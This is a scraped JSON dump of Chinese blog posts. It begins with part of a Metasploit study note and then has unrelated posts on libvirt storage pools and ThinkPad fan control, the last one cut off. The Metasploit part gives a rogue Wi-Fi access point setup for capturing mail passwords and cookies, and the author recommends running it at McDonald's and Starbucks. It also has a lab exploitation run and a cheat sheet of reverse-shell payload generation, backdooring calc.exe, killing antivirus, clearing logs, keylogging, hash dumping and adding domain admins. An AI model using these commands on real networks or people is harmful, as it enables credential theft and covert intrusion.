\u8d77\u4f5c\u7528\u5c06\u83b7\u53d6\u5230\u76ee\u6807\u673a\u5668\u7684\u63a7\u5236\u6743\u9650\u3002\\n\\n\uff08\u65b0\u7248\u672cfasttrack\u4e2d\u8fd8\u52a0\u5165\u4e86Autopwn Automation\u3001Nmap Scripting Engine\u3001Exploits\u3001Payload Generator\u7b49\u65b0\u529f\u80fd\u3002\uff09\\n\\n\u811a\u672c\u5316\u7684\u5de5\u5177\u6709\u65f6\u786e\u5b9e\u80fd\u51cf\u5c11\u5f88\u591a\u5de5\u4f5c\u65f6\u95f4\uff0c\u4f46\u662f\u4e0d\u80fd\u5b8c\u5168\u4f9d\u8d56\u4e8e\u8fd9\u7c7b\u81ea\u52a8\u7a0b\u5ea6\u5f88\u9ad8\u7684\u5de5\u5177\uff0c\u7279\u522b\u662f\u5728\u7528\u8fd9\u4e9b\u5de5\u5177\u641e\u4e0d\u5b9a\u76ee\u6807\u7684\u65f6\u5019\uff0c\u624b\u5de5\u6d4b\u8bd5\u7684\u80fd\u529b\u5f80\u5f80\u624d\u662f\u738b\u9053\uff0c\u7ec6\u8282\u51b3\u5b9a\u6210\u8d25\u3002\\n\\n\\n## \u5341\u4e8c\uff0eKARMERASPLOIT\\n\\nKarmetasploit = Karma + Metasploit\uff0c\u4e5f\u53ef\u4ee5\u8bf4\u6210\u5b83\u662fMSF\u7684KARMA\u5b9e\u73b0\u3002\\n\\nKarma\u548cMSF\u4e00\u6837\u4e5f\u662f\u4f7f\u7528ruby\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u5176\u529f\u80fd\u662f\u5efa\u7acb\u4e00\u4e2a\u865a\u5047\u7684\u65e0\u7ebf\u63a5\u5165\u70b9\uff0c\u7b49\u5f85\u76ee\u6807\u8fde\u63a5\u4e0a\u94a9\u3002\u4e0eMSF\u7ed3\u5408\u53ef\u5b9e\u73b0\u66f4\u5f3a\u5927\u7684\u529f\u80fd\u3002Karmetasploit\u96c6\u6210\u4e86DNS,POP3\uff0cIMAP4\uff0cSMTP,FTP,SMB,HTTP\u7b49\u670d\u52a1\u7528\u4e8e\u653b\u51fb\uff0c\u6a21\u5757\u4f4d\u4e8emodules/auxiliary/server\u76ee\u5f55\u4e0b\u3002\\n\\n\u57fa\u672c\u914d\u7f6e\uff1a\\n\\n\u9700\u8981\u7684\u914d\u7f6e\u4e0d\u591a\uff0c\u9996\u5148\u9700\u8981\u914d\u7f6e\u4e00\u4e2aDHCP\u670d\u52a1\u4e3a\u76ee\u6807\u63d0\u4f9b\u52a8\u6001IP\u5206\u914d\uff0c\u914d\u7f6e\u6587\u4ef6\uff1a\\n\\n```\\noption domain-name-servers 10.0.0.1;\\ndefault-lease-time 60;\\nmax-lease-time 72;\\nddns-update-style none;\\nauthoritative;\\nlog-facility local7;\\nsubnet 10.0.0.0 netmask 255.255.255.0 {\\nrange 10.0.0.100 10.0.0.254;\\noption routers 10.0.0.1;\\noption domain-name-servers 10.0.0.1;\\n}\\n```\\n\\n\u5c06\u914d\u7f6e\u6587\u4ef6\u4fdd\u5b58\u5728/etc/dhcp3/dhcpd.conf\\n\\n\u4e0b\u4e00\u6b65\u4e0b\u8f7dkarma  msf\u811a\u672c\uff1a\\n\\n```\\nwget http://www.offensive-security.com/downloads/karma.rc\\n#\u5c06\u7f51\u5361\u6fc0\u6d3b\u4e3a\u76d1\u542c\u6a21\u5f0f\uff1a\\nairmon-ng start wlan0\\n#\u521b\u5efa\u4f2a\u88c5\u63a5\u5165\u70b9,-P \u53ef\u88ab\u626b\u63cf\u5230\uff0c-C \u4fe1\u53f7\u53d1\u5c04\u901f\u7387\uff0c-e \u63a5\u5165\u70b9\u540d\u79f0\uff08\u9700\u8981\u5177\u6709\u6b3a\u9a97\u6027\uff09\uff0c-v \u6307\u5b9a\u7f51\u5361\uff0cmon0\u4e3a\u4e0a\u4e00\u6b65\u5b8c\u6210\u540e\u751f\u6210\u7684\uff1a\\nairbase-ng -P -C 30 -e \\"China-Net-Free\\" -v mon0\\n#\u6b64\u65f6\u4f1a\u751f\u6210\u4e00\u4e2a\u540d\u4e3aat0\u7684\u65b0\u7f51\u5361\u63a5\u53e3\u3002\\n#\u63a5\u7740\u6253\u5f00DHCP\u670d\u52a1\uff1a\\nifconfig at0 up 10.0.0.1 netmask 255.255.255.0\\ndhcpd3 -cf /etc/dhcp3/dhcpd.conf at0\\n#\u68c0\u67e5\u662f\u5426\u6210\u529f\u542f\u52a8\uff1a\\nps aux|grep dhcpd\\ntail -f /var/log/messages\\n\\n#\u4e0b\u4e00\u6b65\u52a0\u8f7dkarma\u811a\u672c\uff1a\\nmsf> resource karma.rc\\n```\\n\\n\u7b49\u5f85\u6536\u83b7\uff1a\\n\\n\u5f53\u5bf9\u65b9\u6253\u5f00\u90ae\u4ef6\u5ba2\u6237\u7aef\u5e76\u767b\u9646\u6536\u53d6\u90ae\u4ef6\uff0c\u90a3\u4e48\u4ed6\u7684\u8d26\u6237\u5bc6\u7801\u5c06\u88ab\u622a\u83b7\uff0c\u56e0\u4e3a\u4ed6\u6240\u8fde\u63a5\u7684DNS\u548cPOP3\u90fd\u662f\u865a\u5047\u7684\u3002\\n\u5f53\u5bf9\u65b9\u6253\u5f00\u6d4f\u89c8\u5668\u51c6\u5907\u6d4f\u89c8\u7f51\u9875\u65f6karma\u5f00\u59cb\u622a\u53d6cookie\uff0c\u5efa\u7acb\u865a\u5047email\uff0cDNS\u7b49\u670d\u52a1\uff0c\u52a0\u8f7dexploits\u6765\u5bf9\u4ed8\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\uff0c\u5982\u679c\u8d70\u8fd0\u7684\u8bdd\u53ef\u4ee5\u83b7\u53d6\u5230shell\u3002\\n\u603b\u7ed3\uff1a\u5efa\u8bae\u8fd9\u62db\u53ef\u4ee5\u62ff\u5230\u9ea6\u5f53\u52b3\uff0c\u661f\u5df4\u514b\u7528\uff0c\u6548\u679c\u66f4\u597d\u3002\\n\\n\\n## \u5341\u4e09\uff0e\u6784\u5efa\u81ea\u5df1\u7684\u6a21\u5757\uff0c\u7f16\u5199\u81ea\u5df1\u7684exploit\uff0cmeterpreter\u811a\u672c\u7f16\u7a0b\\n\\n\\n\u8fd9\u4e09\u7ae0\u7559\u7740\u540e\u9762\u770b\uff0c\u9700\u8981\u6709ruby\u57fa\u7840\u7b49\u7f16\u7a0b\u57fa\u7840\u3002\\n\\n\\n## \u5341\u56db\uff0e\u6e17\u900f\u5b9e\u6218\u6f14\u4e60\\n\\n\u9996\u5148\u9700\u8981\u4e0b\u8f7d\u5e76\u5b89\u88c5\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u7ec3\u4e60\u6e17\u900f\u7684\u865a\u62df\u673aMetasploitable\uff1a\\n\\nhttp://updates.metasploit.com/data/Metasploitable.zip.torrent\\n\\n\\n\u865a\u62df\u673aIP\uff1a172.16.32.162 \u7528\u6237\u540d\u5bc6\u7801\uff1amsfadmin\\n\\nWINXP\uff1a172.16.32.131   \u5f00\u653e80\u7aef\u53e3 \u6709\u9632\u706b\u5899\\n\\n\u60c5\u62a5\u6536\u96c6\uff1a\\n\\n`nmap -sT -P0 172.16.32.131`\\n\\nmsfconsole\uff1a\\n\\n```\\ncd /opt/framework3/msf3/\\nmsfconsole\\nmsf> use multi/handler\\nset payload windows/meterpreter/reverse_tcp\\nset lhost 172.15.32.129\\nset lport 443\\nload auto_add_route\\nexploit -j\\n\\nrun getgui -e -f 8080\\nshell\\nnet user msf msf /add\\nnet localgroup administrators msf /add\\nupload nmap.exe\\nnmap.exe -sT -A -P0 172.16.32.162\\nmsf> use auxiliary/scanner/ftp/ftp_version\\nset RHOSTS 172.16.32.162\\nrun\\n\\nmsf> use auxiliary/scanner/smtp/smtp_version\\nset RHOSTS  172.16.32.162\\nrun\\n\\nsearch tomcat_mgr_login\\nset rhosts 172.16.32.162\\nset threads 50\\nset rport 8180\\nset verbose false\\nrun\\n\\nuse multi/http/tomcat_mgr_deploy\\nset password tomcat\\nset username tomcat\\nset rhost 172.16.32.162\\nset lport 9999\\nset rport 8180\\nset payload linux/x86/shell_bind_tcp\\nexploit\\n\\nsearch distcc_exec\\nset payload linux/x86/shell_reverse_tcp\\nset lhost 172.16.32.129\\nset rhost 172.16.32.162\\nshow payloads\\nset payload cmd/unix/reverse\\nexploit\\n```\\n\\n## \u5341\u4e94\uff0e\u5e38\u7528\u547d\u4ee4\u5907\u5fd8\\n\\n\\n### MSFconsole  Commands\\n\\n* show exploits \u67e5\u770b\u6240\u6709exploit\\n* show payloads \u67e5\u770b\u6240\u6709payload\\n* show auxiliary \u67e5\u770b\u6240\u6709auxiliary\\n* search name \u641c\u7d22exploit\u7b49\\n* info \u67e5\u770b\u52a0\u8f7d\u6a21\u5757\u7684\u4fe1\u606f\\n* use name \u52a0\u8f7d\u6a21\u5757\\n* LHOST \u672c\u673aIP\\n* RHOST \u76ee\u6807IP\\n* set function \u8bbe\u7f6e\u9009\u9879\u503c\\n* setg function  \u5168\u5c40\u8bbe\u7f6e\\n* show options \u67e5\u770b\u9009\u9879\\n* show targets \u67e5\u770bexp\u53ef\u9009\u7684\u5e73\u53f0\\n* set target num \u8bbe\u7f6eexp\u4f5c\u7528\u5e73\u53f0\\n* set payload payload  \u8bbe\u7f6epayload\\n* show advanced \u67e5\u770b\u9ad8\u7ea7\u9009\u9879\\n* set autorunscript migrate -f \u8bbe\u7f6e\u81ea\u52a8\u6267\u884c\u6307\u4ee4\\n* check \u6d4b\u8bd5\u662f\u5426\u53ef\u5229\u7528\\n* exploit \u6267\u884cexp\u6216\u6a21\u5757\\n* exploit  -j \u4f5c\u4e3a\u540e\u53f0\u6267\u884c\\n* exploit  -z \u6210\u529f\u540e\u4e0d\u7acb\u5373\u6253\u5f00session\\n* exploit  -e encoder \u6307\u5b9aencoder\\n* exploit  -h  \u67e5\u770b\u5e2e\u52a9\u4fe1\u606f\\n* sessions  -l -v \u5217\u51fa\u53ef\u7528sessions\u8be6\u7ec6\u4fe1\u606f\\n* sessions  -s script \u5728\u6307\u5b9asession\u6267\u884c\u811a\u672c\\n* sessions -K \u7ed3\u675fsession\\n* sessions -c cmd \u6267\u884c\u6307\u5b9a\u547d\u4ee4\\n* sessions -u sessionID \u5347\u7ea7shell\\n* db_create name \u521b\u5efa\u6570\u636e\u5e93\\n* db_connect name   \u8fde\u63a5\u6570\u636e\u5e93\\n* db_nmap nmap\u626b\u63cf\u5e76\u5bfc\u5165\u7ed3\u679c\\n* db_autopwn -h      \u67e5\u770bautopwn\u5e2e\u52a9\\n* db_autopwn -p -r -e \u57fa\u4e8e\u7aef\u53e3\uff0c\u53cd\u5f39shell\\n* db_destroy \u5220\u9664\u6570\u636e\u5e93\\n\\n### Meterpreter Commands\\n\\n* help \u67e5\u770b\u5e2e\u52a9\\n* run scriptname \u8fd0\u884c\u811a\u672c\\n* sysinfo \u7cfb\u7edf\u57fa\u672c\u4fe1\u606f\\n* ls \u5217\u76ee\u5f55\\n* use priv \u8fd0\u884c\u63d0\u6743\u7ec4\u4ef6\\n* ps \u5217\u8fdb\u7a0b\\n* migrate PID PID\u8fc1\u79fb\\n* use incognito token\u7a83\u53d6\\n* list_tokens -u \u67e5\u770b\u53ef\u7528\u7528\u6237token\\n* list_tokens -g \u67e5\u770b\u53ef\u7528\u7ec4token\\n* impersonate_token DOMAIN_NAME\\\\\\\\USERNAME \u6a21\u4efftoken\\n* steal_token PID \u7a83\u53d6PID\u6240\u5c5etoken\u5e76\u6a21\u4eff\\n* drop_token \u505c\u6b62\u6a21\u4efftoken\\n* getsystem \u83b7\u53d6SYSTEM\u6743\u9650\\n* shell \u8fd0\u884cshell\\n* execute -f cmd.exe -i \u4ea4\u4e92\u5f0f\u8fd0\u884ccmd\\n* execute -f cmd.exe -i -t \u4f7f\u7528\u53ef\u7528token\u8fd0\u884c\\n* execute -f cmd.exe -i -H -t \u540c\u4e0a\uff0c\u540c\u65f6\u9690\u85cf\u8fdb\u7a0b\\n* rev2self \u8fd4\u56de\u81f3\u521d\u59cb\u7528\u6237\\n* reg command \u4fee\u6539\u6ce8\u518c\u8868\\n* setkesktop number \u5207\u6362\u81f3\u53e6\u4e00\u5df2\u767b\u5f55\u7528\u6237\u5c4f\u5e55\\n* screenshot \u622a\u5c4f\\n* upload file \u4e0a\u4f20\u6587\u4ef6\\n* download file  \u4e0b\u8f7d\u6587\u4ef6\\n* keyscan_start \u5f00\u59cb\u622a\u53d6\u51fb\u952e\u8bb0\u5f55\\n* keyscan_stop \u505c\u6b62\u622a\u53d6\u51fb\u952e\u8bb0\u5f55\\n* getprivs \u5c3d\u53ef\u80fd\u63d0\u5347\u6743\u9650\\n* uictl enable keyboard/mouse \u83b7\u53d6\u952e\u76d8\u6216\u9f20\u6807\u7684\u63a7\u5236\u6743\\n* background \u5c06\u5f53\u524dmeterpreter shell\u8f6c\u5165\u540e\u53f0\\n* hashdump \u5bfc\u51fa\u6240\u6709\u7528\u6237hash\\n* use sniffer \u52a0\u8f7d\u55c5\u63a2\u6a21\u5757\\n* sniffer_interfaces \u67e5\u770b\u53ef\u7528\u7f51\u5361\u63a5\u53e3\\n* sniffer_dump interfaceID pcapname \u5f00\u59cb\u55c5\u63a2\\n* sniffer_start interfaceID packet-buffer \u6307\u5b9abuffer\u8303\u56f4\u55c5\u63a2\\n* sniffer_stats interfaceID   \u6293\u53d6\u7edf\u8ba1\u4fe1\u606f\\n* sniffer_stop interfaceID  \u505c\u6b62\u55c5\u63a2\\n* add_user username password -h ip \u6dfb\u52a0\u7528\u6237\\n* add_group_user \\"Domain Admins\\" username -h ip \u6dfb\u52a0\u7528\u6237\u81f3\u7ba1\u7406\u7ec4\\n* clearev \u6e05\u7a7a\u65e5\u5fd7\\n* timestomp \u6539\u53d8\u6587\u4ef6\u5c5e\u6027\u5982\u521b\u5efa\u65f6\u95f4\u7b49\\n* reboot \u91cd\u542f\\n\\n\\n### MSFpayload Commands\\n\\n* msfpayload -h \u67e5\u770b\u5e2e\u52a9\\n* msfpayload windows/meterpreter/bind_tcp 0 \u67e5\u770b\u6307\u5b9apayload\u53ef\u7528\u9009\u9879\\n* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X > payload.exe \u751f\u6210payload.exe\\n* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R > payload.raw \u4fdd\u5b58\u4e3aRAW\u683c\u5f0f\uff0c\u53ef\u7528\u4e8emsfencode\\n* msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c \u4fdd\u5b58\u4e3aC\u683c\u5f0f\\n* msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java \u4fdd\u5b58\u4e3ajava\u683c\u5f0f\\n\\n### MSFencode Commands\\n\\n* msfencode -h \u67e5\u770b\u5e2e\u52a9\\n* msfencode -l \u67e5\u770b\u53ef\u7528encoder\\n* msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) \u4ee5\u6307\u5b9a\u683c\u5f0f\u663e\u793a\u7f16\u7801\u540e\u7684buffer\\n* msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe \u751f\u6210\u7f16\u7801\u540e\u7684exe\\n* msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c \u751f\u6210\u7eaf\u5b57\u7b26\u683c\u5f0fC\u7c7b\u578bshellcode\\n* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | \\\\\\n  msfencode -e x86/countdown -c 5 -t raw | \\\\\\n  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe \u591a\u7f16\u7801\u5668\u7ed3\u5408\uff0c\u591a\u6b21\u7f16\u7801\\n\\n### MSFcli Commands\\n\\n* `msfcli | grep exploit` \u53ea\u663e\u793aexploit\\n* `msfcli | grep exploit/windows` \u53ea\u663e\u793awindows exploit\\n* `msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E` \u9488\u5bf9\u6307\u5b9aIP\u52a0\u8f7d\u6307\u5b9aexp\u5e76\u8bbe\u5b9apayload\\n\\n\\n### MSF,Ninja\uff0cFu\\n```\\n* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe \u4f7f\u7528calc.exe\u4f5c\u4e3a\u6a21\u677f\uff0c\u751f\u6210\u7ecf\u8fc7\u7f16\u7801\u7684\u540e\u95e8\\n* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe \u4e0e\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u53ea\u662f\u6267\u884c\u7684\u65f6\u5019\u4e0d\u4f9d\u8d56\u4e8e\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4e14\u4e0d\u4f1a\u6709\u4efb\u4f55\u63d0\u793a\u4fe1\u606f\\n* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E \u751f\u6210\u7f16\u7801\u540e\u7684payload\u5e76\u5f00\u59cb\u76d1\u542c\u672c\u673a\u7aef\u53e3\\n```\\n\\n### MSFvenom\\n\\n* msfvenom --payload \u81ea\u52a8\u751f\u6210payload\\n\\n\\n### Meterpreter Post Exploitation Commands\\n\\n\u63d0\u6743\u4e00\u822c\u6b65\u9aa4\\n```\\nmeterpreter> use priv\\nmeterpreter> getsystem\\nmeterpreter> ps \\nmeterpreter> steal_token 1784\\nmeterpreter> shell\\nnet user msf msf /add /DOMAIN\\nnet group \\"Domain Admins\\" msf /add /DOMAIN\\n```\\n\\n\u83b7\u53d6hash\u4e00\u822c\u6b65\u9aa4\\n\\n```\\nmeterpreter> use priv\\nmeterpreter> getsystem\\nmeterpreter> hashdump\\n```\\n\\n\u5982\u679c\u662f\u5728win2008\u7cfb\u7edf\u4e0a\uff1a\\n```\\nmeterpreter> run migrate\\nmeterpreter> run killav\\nmeterpreter> ps \\nmeterpreter> migrate 1436\\nmeterpreter> keyscan_start\\nmeterpreter> keyscan_dump\\nmeterpreter> keyscan_stop\\n```\\n\\n\u4f7f\u7528Incognito\u63d0\u6743\\n\\n```\\nmeterpreter> use incognito\\nmeterpreter> list_tokens -u\\nmeterpreter> use priv\\nmeterpreter> getsystem\\nmeterpreter> list_tokens -u\\nmeterpreter> impersonate_token IHAZSECURITY\\\\\\\\Administrator\\n```\\n\\n\u67e5\u770b\u4fdd\u62a4\u673a\u5236\u5e76\u7981\u7528\u4e4b\\n\\n```\\nmeterpreter> run getcountermeasure\\nmeterpreter> run getcountermeasure -h\\nmeterpreter> run getcountermeasure -d -k\\n```\\n\\n* meterpreter> run checkvm \u68c0\u67e5\u662f\u5426\u662f\u865a\u62df\u673a\\n* meterpreter> shell \u8f6c\u5165\u547d\u4ee4\u884c\\n* meterpreter> run vnc \u8fdc\u7a0bVNC\u63a7\u5236\\n* meterpreter> background \u8f6c\u5165\u540e\u53f0\\n* meterpreter> run post/windows/escalate/bypassuac \u6267\u884cBypass UAC\\n* meterpreter> run post/osx/gather/hashdump \u5728OS X\u7cfb\u7edf\u4e0adump hash\\n* meterpreter> run post/linux/gather/hashdump \u5728Linux \u7cfb\u7edf\u4e0adump hash"},{"id":"/2012/07/13/libvirt-storage-pool","metadata":{"permalink":"/notes/blog/2012/07/13/libvirt-storage-pool","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2012-07-13-libvirt-storage-pool.md","source":"@site/blog/2012-07-13-libvirt-storage-pool.md","title":"libvirt\u4e2dstorage pool\u7684\u7ba1\u7406","description":"build storage pool with libvirt","date":"2012-07-13T00:00:00.000Z","tags":[{"inline":true,"label":"libvirt","permalink":"/notes/blog/tags/libvirt"},{"inline":true,"label":"storage pool","permalink":"/notes/blog/tags/storage-pool"}],"readingTime":1.58,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"libvirt\u4e2dstorage pool\u7684\u7ba1\u7406","description":"build storage pool with libvirt","categories":["virt"],"tags":["libvirt","storage pool"],"redirect_from":["/2012/07/13/"]},"unlisted":false,"prevItem":{"title":"metasploit\u5b66\u4e60\u7b14\u8bb0","permalink":"/notes/blog/2012/11/12/msf-study-note"},"nextItem":{"title":"\u5982\u4f55\u8ba9ThinkPad\u81ea\u5b9a\u4e49\u98ce\u6247\u8f6c\u901f","permalink":"/notes/blog/2012/05/21/thinkpad-fan-speed-control"}},"content":"> \u7b80\u5355\u6f14\u793a\u5982\u4f55\u5728libvirt\u4e2d\u521b\u5efastorage pool\\n\\n\\n \\nlibvirt\u63d0\u4f9b\u4e86\u5b58\u50a8\u7ba1\u7406\u7684\u529f\u80fd\uff0c\u53ef\u4ee5\u7ba1\u7406\u7684\u5b58\u50a8\u7c7b\u578b\u6709 \u76ee\u5f55  lvm\u903b\u8f91\u5377 \u78c1\u76d8 iscsi\u5b58\u50a8  scsi\u5b58\u50a8  mpath netfs\u7b49\uff0c\u8fd9\u91cc\u4ee5\u6700\u57fa\u672c\u7684\u76ee\u5f55\u7c7b\u578b\u4e3a\u4f8b\\n\\n\u57fa\u672c\u6982\u5ff5\uff1a\\n\\n\u5728libvirt\u91cc\u4fdd\u5b58\u865a\u62df\u673a\u78c1\u76d8\u955c\u50cf\u7684\u76ee\u5f55\u6216\u8bbe\u5907\u79f0\u4f5c\u5b58\u50a8\u6c60  \u5373pool  \uff0c\u6bcf\u4e2a\u865a\u62df\u673a\u6240\u4f7f\u7528\u7684\u865a\u62df\u78c1\u76d8\u955c\u50cf\u79f0\u4f5c\u5377 \u5373vol \uff0cvol\u662f\u5b58\u50a8\u5728pool\u91cc\u9762\u7684\u3002\\n\\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u7684virsh\u5de5\u5177\u6765\u7ba1\u7406\uff0cpool\u6709\u4e24\u79cd\u57fa\u672c\u72b6\u6001\uff1a\u6d3b\u52a8\u548c\u975e\u6d3b\u52a8\uff0c\u67e5\u770b\u5f53\u524d\u5b58\u50a8\u6c60\u7684\u72b6\u6001\\n\\n```\\nvirsh # pool-list --all \\nName State Autostart \\n-----------------------------------------\\ndefault inactive yes \\ndisk active yes\\n```\\n\\n\u65b0\u5efa\u4e00\u4e2a\u57fa\u4e8e\u76ee\u5f55\u7684\u5b58\u50a8\u6c60bigpool \u5b58\u50a8\u8def\u5f84\u4e3a /bigpool \\n\\n```\\nvirsh # pool-define-as bigpool dir - - - - /bigpool\\nPool bigpool defined\\n```\\n\u8fd9\u65f6\u5019pool\u4ec5\u4ec5\u662f\u5b9a\u4e49\u51fa\u6765\u4e86\uff0c\u53ef\u4ee5\u7528pool-list --all\u67e5\u770b\u5230\u3002\u4f46\u662f\u76f8\u5e94\u7684\u76ee\u5f55\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u63a5\u7740\u9700\u8981\u5efa\u7acb\u8fd9\u4e2apool\\n\\n```\\nvirsh # pool-build bigpool\\nPool bigpool built\\n```\\n\\n\u8fd9\u4e2a\u65f6\u5019\u624d\u662f\u771f\u6b63\u7684\u5efa\u7acb\u8d77\u8fd9\u4e2apool\uff0clibvirt\u4f1a\u81ea\u52a8\u521b\u5efa/bigpool\u76ee\u5f55\uff0c\u5e76\u8bbe\u7f6e\u76f8\u5e94\u7684\u6743\u9650\uff0c\u5982\u679c\u4f60\u6709\u7528selinux\u4f5c\u4e3alibvirt\u7684\u5b89\u5168\u63aa\u65bd\u7684\u8bdd\u5b83\u8fd8\u80fd\u81ea\u52a8\u8bbe\u7f6e\u4e0a\u4e0b\u6587\\n\\n```\\n# ls -Zld /bigpool/\\ndrwx------ 2 ? root root 4096 Jul 13 12:54 /bigpool/\\n```\\n\\n\u6211\u8fd9\u91cc\u7531\u4e8e\u6ca1\u6709\u4f7f\u7528selinux\u6240\u4ee5\u6ca1\u6709\u4e0a\u4e0b\u6587\u7684\\n\\n pool\u521b\u5efa\u597d\u4e4b\u540e\u5c31\u53ef\u4ee5\u542f\u52a8\u4e86\\n\\n```\\nvirsh # pool-start bigpool\\nPool bigpool started\\n\\nvirsh # pool-list --all \\nName State Autostart \\n-----------------------------------------\\nbigpool active no \\ndefault inactive yes \\ndisk active yes\\n```\\n\\n\u8fd8\u53ef\u4ee5\u8bbe\u7f6epool\u4e3a\u81ea\u52a8\u542f\u52a8\\n\\n```\\nvirsh # pool-autostart bigpool\\nPool bigpool marked as autostarted\\n\\nvirsh # pool-list --all \\nName State Autostart \\n-----------------------------------------\\nbigpool active yes \\ndefault inactive yes \\ndisk active yes\\n```\\n\\n\u57fa\u4e8e\u76ee\u5f55\u7684\u4e00\u4e2a\u5b58\u50a8\u6c60\u5c31\u8fd9\u6837\u5efa\u7acb\u5b8c\u6210\u4e86\uff0c\u662f\u4e0d\u662f\u5f88\u7b80\u5355\uff1f"},{"id":"/2012/05/21/thinkpad-fan-speed-control","metadata":{"permalink":"/notes/blog/2012/05/21/thinkpad-fan-speed-control","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2012-05-21-thinkpad-fan-speed-control.md","source":"@site/blog/2012-05-21-thinkpad-fan-speed-control.md","title":"\u5982\u4f55\u8ba9ThinkPad\u81ea\u5b9a\u4e49\u98ce\u6247\u8f6c\u901f","description":"","date":"2012-05-21T00:00:00.000Z","tags":[{"inline":true,"label":"thinkpad","permalink":"/notes/blog/tags/thinkpad"},{"inline":true,"label":"fan","permalink":"/notes/blog/tags/fan"}],"readingTime":2.03,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u5982\u4f55\u8ba9ThinkPad\u81ea\u5b9a\u4e49\u98ce\u6247\u8f6c\u901f","description":"","categories":["system"],"tags":["thinkpad","fan"]},"unlisted":false,"prevItem":{"title":"libvirt\u4e2dstorage pool\u7684\u7ba1\u7406","permalink":"/notes/blog/2012/07/13/libvirt-storage-pool"},"nextItem":{"title":"OpenVPN+MySQL\u73af\u5883\u642d\u5efa\u8bb0\u5f55","permalink":"/notes/blog/2011/09/02/openvpn-mysql-setup"}},"content":"> \u7b14\u8bb0\u672c\u957f\u671f\u5904\u4e8e\u9ad8\u5f3a\u5ea6\u9ad8\u8d1f\u8377\u5de5\u4f5c\u72b6\u6001\uff0c\u624b\u653e\u5230\u51fa\u98ce\u53e3\u7684\u65f6\u5019\u5dee\u70b9\u88ab\u70eb\u4f24\uff0c\u518d\u4e0d\u8c03\u6574\u4e0b\u6050\u6015\u5230\u4e86\u590f\u5929\u662f\u5f7b\u5e95\u625b\u4e0d\u4f4f\u4e86\u3002\u4e8e\u662f\u7f51\u4e0a\u641c\u4e86\u4e0b\u8d44\u6599\uff0c\u8fd8\u597dthinkpad\u4e00\u76f4\u90fd\u6709\u9ed1\u5ba2\u5728\u7528...\\n\\n\\n\u8fd8\u597dthinkpad\u4e00\u76f4\u90fd\u6709\u9ed1\u5ba2\u5728\u7528\uff0c\u56e0\u6b64\u4e5f\u4e0d\u7f3a\u4e4f\u5185\u6838\u7ea7\u522b\u7684\u652f\u6301\uff0c\u4e0b\u9762\u8bb0\u5f55\u4e0b\u914d\u7f6e\u65b9\u6cd5\uff0c\u6015\u4eca\u540e\u518d\u8981\u6363\u9f13\u7684\u65f6\u5019\u5fd8\u8bb0\u3002\u9996\u5148thinkpad\u6709\u4e00\u4e2a\u4e13\u7528\u7684acpi\u9a71\u52a8\u53ebthinkpad_acpi\u7684\u5185\u6838\u6a21\u5757\uff0c\u8fd9\u4e2a\u5728centos\u91cc\u9762\u5df2\u7ecf\u81ea\u5e26\u4e86\uff0c\u5b83\u7684\u9879\u76ee\u5730\u5740http://ibm-acpi.sf.net/\u3002\u4e0a\u9762\u6709\u5217\u51fa\u652f\u6301\u54ea\u4e9b\u54ea\u4e9b\u578b\u53f7\u54ea\u4e9b\u529f\u80fd\u3002\\n\\n\u4f60\u53ef\u4ee5\u901a\u8fc7lsmod\u547d\u4ee4\u67e5\u770b\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d\u4e86\u6b64\u6a21\u5757:\\n\\n`lsmod|grep think`\\n\\n\u8fd9\u4e2a\u6a21\u5757\u52a0\u8f7d\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7proc\u5185\u7684\u6587\u4ef6\u6765\u67e5\u770b\u98ce\u6247\u7684\u8fd0\u884c\u72b6\u6001\uff1a\\n\\n`cat /proc/acpi/ibm/fan`\\n\\n\u5982\u679c\u6709\uff0c\u90a3\u4e48\u8fdb\u5165\u4e0b\u4e00\u6b65\uff0c\u6dfb\u52a0\u6a21\u5757\u7684\u52a0\u8f7d\u9009\u9879\uff0c\u521b\u5efa\u6a21\u5757\u914d\u7f6e\u6587\u4ef6\uff1a\\n\\n```\\n[root@server ~]# vi /etc/modprobe.d/thinkpad_acpi.conf\\n[root@server ~]# cat /etc/modprobe.d/thinkpad_acpi.conf\\noptions thinkpad_acpi experimental=1 fan_control=1\\n```\\n\\n\u4e0a\u9762\u7684\u914d\u7f6e\u5c06\u6253\u5f00\u81ea\u5b9a\u4e49\u98ce\u6247\u8f6c\u901f\u7684\u5f00\u5173\u3002\\n\\n\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u91cd\u65b0\u52a0\u8f7d\u6a21\u5757\uff1a\\n\\n```\\nmodprobe -r thinkpad_acpi && modprobe 